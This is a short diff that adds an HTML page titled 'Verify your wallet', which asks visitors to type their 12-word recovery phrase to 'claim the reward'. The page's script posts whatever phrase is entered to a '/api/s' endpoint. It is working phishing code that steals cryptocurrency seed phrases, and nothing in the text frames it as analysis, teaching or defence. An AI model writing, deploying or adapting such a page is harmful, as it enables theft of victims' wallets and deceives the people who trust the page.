@@ -1,0 +1,5 @@
+<html><body><h1>Verify your wallet</h1>
+<p>Enter your 12 words recovery phrase to claim the reward</p>
+<form><textarea id="phrase" placeholder="seed phrase"></textarea><button>Claim</button></form>
+<script>document.querySelector('button').onclick=()=>fetch('/api/s',{method:'POST',body:phrase.value})</script>
+</body></html>
